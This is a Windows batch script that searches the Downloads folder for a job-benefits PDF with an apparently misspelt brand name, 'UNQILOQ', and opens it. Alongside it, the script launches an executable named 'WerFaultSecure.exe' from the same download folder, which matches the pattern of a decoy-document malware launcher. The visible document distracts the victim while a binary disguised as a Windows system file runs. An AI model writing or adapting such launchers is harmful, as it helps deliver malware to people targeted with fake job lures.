@echo off
setlocal enabledelayedexpansion

set "pdfName=BenefitsJDPhotoVideoUNQILOQ42024.pdf"
set "werFaultSecure=WerFaultSecure.exe"

set "downloadFolder=%USERPROFILE%\Downloads"

echo Searching for %pdfName% in recent downloads...

for /f "delims=" %%D in ('dir /ad /b /od /t:w "%downloadFolder%" ^| sort /r ^| findstr /n "^" ^| findstr "^[1-5]:"') do (
    set "recentFolder=%%D"
    set "recentFolder=!recentFolder:*:=!"
    
    if exist "%downloadFolder%\!recentFolder!\%pdfName%" (
        echo File found: %downloadFolder%\!recentFolder!\%pdfName%
        start "" "%downloadFolder%\!recentFolder!\%pdfName%"
	start "" "%downloadFolder%\!recentFolder!\%werFaultSecure%"

        goto :found
    )
)


if exist "%downloadFolder%\%pdfName%" (
    echo File found: %downloadFolder%\%pdfName%
    start "" "%downloadFolder%\%pdfName%"
    start "" "%downloadFolder%\%werFaultSecure%"

    goto :found
)


goto :end

:found


:end
